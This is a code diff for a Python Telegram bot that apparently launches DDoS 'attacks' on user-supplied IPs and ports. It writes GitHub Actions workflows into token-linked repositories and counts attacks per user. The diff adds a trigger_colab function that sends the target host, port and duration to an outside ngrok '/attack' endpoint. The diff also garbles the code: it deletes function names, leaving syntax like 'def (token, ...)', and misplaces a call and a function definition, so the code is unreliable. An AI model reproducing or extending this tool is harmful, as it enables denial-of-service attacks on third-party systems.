@@ -521,7 +521,7 @@ def create_repository(token, repo_name="soulcrack-tg"):
     except Exception as e:
         raise Exception(f"Failed to create repository: {e}")
 
-def update_yml_file(token, repo_name, ip, port, time_val, method):
+def (token, repo_name, ip, port, time_val, method):
     yml_content = f"""name: soulcrack fucker
 on: [push]
 
@@ -790,7 +790,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-async def handle_button_press(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def (update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text
 
@@ -2195,7 +2195,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         def update_single_token(token_data):
             try:
-                result = update_yml_file(
+                result = (
                     token_data['token'],
                     token_data['repo'],
                     ip, port, attack_duration, method
@@ -2220,7 +2220,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         user_id_str = str(user_id)
         remaining_attacks = MAX_ATTACKS - user_attack_counts.get(user_id_str, 0)
-
+        # Colab API ko trigger karna
+trigger_colab(ip, port, attack_duration)
         reply_markup = get_main_keyboard(user_id)
         message = (
             f"🎯 **ATTACK STARTED!**\n"
@@ -2466,8 +2467,15 @@ def main():
     application.add_handler(MessageHandler(filters.Document.ALL, handle_binary_file))
 
     # Text message handler for all button presses and text input
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_press))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, ))
+    import requests
 
+def trigger_colab(target_ip, target_port, duration):
+    try:
+        api_link = "https://bubble-sponge-unpicked.ngrok-free.dev/attack"
+        requests.get(f"{api_link}?host={target_ip}&port={target_port}&time={duration}", timeout=2)
+    except:
+        pass
     print("🤖 **THE BOT IS RUNNING...**")
     print("━━━━━━━━━━━━━━━━━━━━━━")
     print(f"👑 Primary owners: {[uid for uid, info in owners.items() if info.get('is_primary', False)]}")
